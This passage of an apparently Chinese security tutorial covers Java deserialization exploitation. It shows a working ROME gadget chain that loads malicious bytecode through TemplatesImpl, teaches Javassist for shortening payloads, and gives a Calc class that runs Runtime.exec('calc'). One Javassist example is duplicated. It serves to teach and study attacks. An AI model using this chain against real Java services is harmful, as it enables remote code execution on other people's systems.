<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Files</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>nio<span class="token punctuation">.</span>file<span class="token punctuation">.</span></span><span class="token class-name">Paths</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Hashtable</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ROME_HashTable</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">TemplatesImpl</span> templatesimpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytecodes <span class="token operator">=</span> <span class="token class-name">Files</span><span class="token punctuation">.</span><span class="token function">readAllBytes</span><span class="token punctuation">(</span><span class="token class-name">Paths</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"F:\\javaDeserialization\\ysoserial-master\\target\\test-classes\\ysoserial\\DoubleExp\\shell.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">setValue</span><span class="token punctuation">(</span>templatesimpl<span class="token punctuation">,</span><span class="token string">"_name"</span><span class="token punctuation">,</span><span class="token string">"aaa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>templatesimpl<span class="token punctuation">,</span><span class="token string">"_bytecodes"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>bytecodes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setValue</span><span class="token punctuation">(</span>templatesimpl<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>templatesimpl<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ObjectBean</span> objectBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectBean</span><span class="token punctuation">(</span><span class="token class-name">ToStringBean</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">Hashtable</span> hashtable <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Hashtable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashtable<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>objectBean<span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">serialize</span><span class="token punctuation">(</span>hashtable<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">"ROME_HashTable.bin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectOutputStream</span> oos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span><span class="token string">"ROME_HashTable.bin"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        oos<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Object</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token class-name">String</span> file<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ObjectInputStream</span> ois <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>file<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span> object <span class="token operator">=</span>ois<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>还有很多其他链子，这里就不一一讲解了。</p>
<h3 id="精简-payload"><a href="#精简-payload" class="headerlink" title="精简 payload"></a>精简 payload</h3><p>在有的情况下，反序列化会限制长度，这个时候就需要来将我们的 payload的长度来进行缩短，最终满足要求，实现反序列化。</p>
<h4 id="通过Javassist缩短恶意class"><a href="#通过Javassist缩短恶意class" class="headerlink" title="通过Javassist缩短恶意class"></a>通过Javassist缩短恶意class</h4><h5 id="什么是-javassist"><a href="#什么是-javassist" class="headerlink" title="什么是 javassist"></a>什么是 javassist</h5><p><font style="color:rgb(64, 64, 64);">Java 字节码是以二进制存储在 .class 文件中，每一个 .class 文件都包含一个 java 类或接口。Javaassist就是一个用来处理Java字节码的类库。它可以在一个已经编译好的类中添加新的方法，或者是修改已有的方法，并且不需要对字节码方面有深入的了解。同时也可以通过完全手动的方式生成一个新的类对象。</font></p>
<p><font style="color:rgb(64, 64, 64);">Maven 依赖:</font></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">></span></span>
    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">></span></span>org<span class="token punctuation">.</span>javassist<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>
    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">></span></span>javassist<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>
    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">></span></span><span class="token number">3.27</span><span class="token number">.0</span><span class="token operator">-</span><span class="token constant">GA</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h5><p>ClassPool是CtClass对象的容器，它按需读取类文件来构造CtClass对象，并且保存CtClass对象以便以后使用。</p>
<p>常用方法：</p>
<ul>
<li>getDefault：返回默认的ClassPool，一般通过该方法创建我们的ClassPool；</li>
<li>appendClassPath, insertClassPath：将一个ClassPath加到类搜索路径的末尾位置 或 插入到起始位置。通常通过该方法写入额外的类搜索路径，以解决多个类加载器环境中找不到类的尴尬；</li>
<li>toClass：将修改后的CtClass加载至当前线程的上下文类加载器中，CtClass的toClass方法是通过调用本方法实现。需要注意的是一旦调用该方法，则无法继续修改已经被加载的class；</li>
<li>makeClass：根据类名创建新的CtClass对象；</li>
<li>get，getCtClass：根据类路径名获取该类的CtClass对象，用于后续的编辑。</li>
</ul>
<p>可以使用toBytecode()函数来获取修改过的字节码：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> b <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>也可以通过toClass()函数直接将CtClass转换成Class对象:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Class</span> clazz <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">toClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>toClass()会请求当前线程的ClassLoader加载CtClass所代表的类文件,它返回此类文件的java.lang.Class对象。</p>
<h5 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h5><p>CtClass类表示一个class文件，每个CtClass对象都必须从ClassPool中获取，CtClass需要关注的方法：</p>
<ul>
<li>addMethod，removeMethod：添加&#x2F;移除一个CtMethod；</li>
<li>writeFile：根据CtClass生成.class文件；</li>
<li>addField，removeField：添加&#x2F;移除一个CtField；</li>
<li>addConstructor，removeConstructor：添加&#x2F;移除一个CtConstructor</li>
<li>freeze：冻结一个类，使其不可修改；isFrozen：判断一个类是否已被冻结；</li>
<li>defrost：解冻一个类，使其可以被修改；</li>
<li>prune：删除类不必要的属性，以减少内存占用。调用该方法后，许多方法无法将无法正常使用，慎用；</li>
<li>detach：将该class从ClassPool中删除；</li>
</ul>
<p>简单例子：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtMethod</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CtMethodExample</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> cc <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"HelloWorld"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个方法</span>
        <span class="token class-name">CtMethod</span> method <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtMethod</span><span class="token punctuation">(</span><span class="token class-name">CtClass</span><span class="token punctuation">.</span>voidType<span class="token punctuation">,</span> <span class="token string">"sayHello"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> cc<span class="token punctuation">)</span><span class="token punctuation">;</span>
        method<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"&#123; System.out.println(\"Hello, World!\"); &#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 将方法添加到类中</span>
        cc<span class="token punctuation">.</span><span class="token function">addMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 输出类的字节码</span>
        cc<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 会生成一个 HelloWorld.class 文件</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="CtMthod"><a href="#CtMthod" class="headerlink" title="CtMthod"></a>CtMthod</h5><p>CtMthod代表类中的某个方法，可以通过CtClass提供的API获取 或者 构造方法 或者 CtNewMethod.make()方法新建，通过CtMethod对象可以实现对方法的修改。重要方法如下：</p>
<ul>
<li>insertBefore：在方法的起始位置插入代码；</li>
<li>insterAfter：在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到exception；</li>
<li>insertAt：在指定的位置插入代码；</li>
<li>setBody：将方法的内容设置为要写入的代码，当方法被abstract修饰时，该修饰符被移除；</li>
<li>make：创建一个新的方法。</li>
</ul>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtMethod</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CtMethodExample</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> cc <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"HelloWorld"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个方法</span>
        <span class="token class-name">CtMethod</span> method <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtMethod</span><span class="token punctuation">(</span><span class="token class-name">CtClass</span><span class="token punctuation">.</span>voidType<span class="token punctuation">,</span> <span class="token string">"sayHello"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> cc<span class="token punctuation">)</span><span class="token punctuation">;</span>
        method<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"&#123; System.out.println(\"Hello, World!\"); &#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 将方法添加到类中</span>
        cc<span class="token punctuation">.</span><span class="token function">addMethod</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 输出类的字节码</span>
        cc<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 会生成一个 HelloWorld.class 文件</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="CtField"><a href="#CtField" class="headerlink" title="CtField"></a>CtField</h5><p>CtField代表类中的某个属性，可以直接通过其构造方法创建实例</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtField</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CtFieldExample</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> cc <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"HelloWorld"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个字段</span>
        <span class="token class-name">CtField</span> field <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtField</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"message"</span><span class="token punctuation">,</span> cc<span class="token punctuation">)</span><span class="token punctuation">;</span>
        field<span class="token punctuation">.</span><span class="token function">setModifiers</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javassist<span class="token punctuation">.</span></span>Modifier</span><span class="token punctuation">.</span><span class="token constant">PUBLIC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 设置字段为公共的</span>

        <span class="token comment">// 将字段添加到类中</span>
        cc<span class="token punctuation">.</span><span class="token function">addField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 输出类的字节码</span>
        cc<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 会生成一个 HelloWorld.class 文件</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="CtConstructor"><a href="#CtConstructor" class="headerlink" title="CtConstructor"></a>CtConstructor</h5><p>CtConstructor代表类中的一个构造器，可以通过CtConstructor.make方法创建：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtConstructor</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CtConstructorExample</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> cc <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"HelloWorld"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 创建一个无参构造函数</span>
        <span class="token class-name">CtConstructor</span> constructor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CtConstructor</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> cc<span class="token punctuation">)</span><span class="token punctuation">;</span>
        constructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"&#123; this.message = \"Hello from Constructor!\"; &#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 将构造函数添加到类中</span>
        cc<span class="token punctuation">.</span><span class="token function">addConstructor</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 输出类的字节码</span>
        cc<span class="token punctuation">.</span><span class="token function">writeFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 会生成一个 HelloWorld.class 文件</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>更多内容见：<a href="https://ljd1996.github.io/2020/04/23/Javassist%E7%94%A8%E6%B3%95/">Javassist用法</a></p>
<h4 id="简化-payload"><a href="#简化-payload" class="headerlink" title="简化 payload"></a>简化 payload</h4><p>以我们的 rome 链为例，我们的恶意类需要继承AbstractTranslet 类才能正常触发整个链子的流程，然而要想将 Java 代码编译成 class 文件，就需要一些必须的结构：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">ysoserial<span class="token punctuation">.</span></span><span class="token class-name">MyCC3</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">DOM</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Calc</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>
            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">RuntimeException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>

    <span class="token punctuation">&#125;</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">&#123;</span>

    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>下面两个空的 transform 方法是必须存在的，不然会编译不成功，这样就会导致我们的 payload 非常的长</p>
<p><img src="https://raw.githubusercontent.com/cr4eper/Myphoto/img/img/1731224923730-be359313-f865-432a-b57e-8cc60f73b7b1.png"></p>
